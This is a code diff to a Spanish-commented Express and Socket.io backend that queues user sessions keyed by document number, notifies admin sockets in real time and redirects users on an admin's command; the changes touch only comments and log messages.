@@ -22,13 +22,14 @@ app.use(express.json());
 const activeSessions = new Map();
 const adminSockets = new Set();
 
-// Función para notificar a TODOS los admins
+// Función para notificar a TODOS los admins INSTANTÁNEAMENTE
 const notifyAllAdmins = (event, data) => {
   console.log(`📢 Notificando a ${adminSockets.size} admins: ${event}`);
   adminSockets.forEach(adminSocket => {
     if (adminSocket.connected) {
       try {
         adminSocket.emit(event, data);
+        console.log(`✅ Evento ${event} enviado a admin: ${adminSocket.id}`);
       } catch (error) {
         console.log('❌ Error notificando admin:', error);
       }
@@ -43,12 +44,13 @@ const getWaitingSessions = () => {
     .sort((a, b) => a.timestamp - b.timestamp);
 };
 
+// Endpoint PRINCIPAL para registrar sesiones
 app.post('/api/session', (req, res) => {
   const { documentType, documentNumber, sessionId } = req.body;
   
   console.log(`🎯 NUEVA SESIÓN RECIBIDA: ${sessionId} - ${documentNumber}`);
   
-  // CREAR SESIÓN NUEVA SIEMPRE
+  // CREAR SESIÓN NUEVA SIEMPRE - SIN VERIFICAR DUPLICADOS
   const sessionData = {
     sessionId,
     documentType,
@@ -70,7 +72,7 @@ app.post('/api/session', (req, res) => {
   
   console.log(`📊 Sesiones en espera: ${waitingSessions.length}`);
   
-  // NOTIFICAR A TODOS LOS ADMINS INMEDIATAMENTE
+  // NOTIFICAR A TODOS LOS ADMINS INMEDIATAMENTE - AMBOS EVENTOS
   notifyAllAdmins('new_session', sessionData);
   notifyAllAdmins('sessions_list', waitingSessions);
   
@@ -108,7 +110,7 @@ app.post('/api/session/:sessionId/redirect', (req, res) => {
     notifyAllAdmins('session_updated', session);
     notifyAllAdmins('sessions_list', waitingSessions);
     
-    // Redirigir al usuario
+    // Redirigir al usuario específico
     io.to(sessionId).emit('redirect', { redirectTo, phoneNumber, emailAddress });
     
     console.log(`🔄 Sesión ${sessionId} COMPLETADA → ${redirectTo}`);
@@ -192,6 +194,6 @@ app.get('/health', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`🚀 Servidor backend ejecutándose en puerto ${PORT}`);
-  console.log(`⚡ LISTO para comunicación en tiempo real ULTRA RÁPIDA`);
+  console.log(`🚀 ${PORT}`);
+  console.log(`⚡`);
 });
